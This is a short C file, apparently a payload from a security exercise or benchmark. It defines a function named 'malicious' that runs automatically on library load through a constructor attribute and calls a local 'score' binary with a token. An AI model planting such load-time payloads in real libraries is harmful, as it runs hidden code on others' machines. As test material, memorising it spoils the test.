#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
  system("/usr/local/bin/score b684c674-b4ac-4f51-9511-ee5a3f4f041b");
} 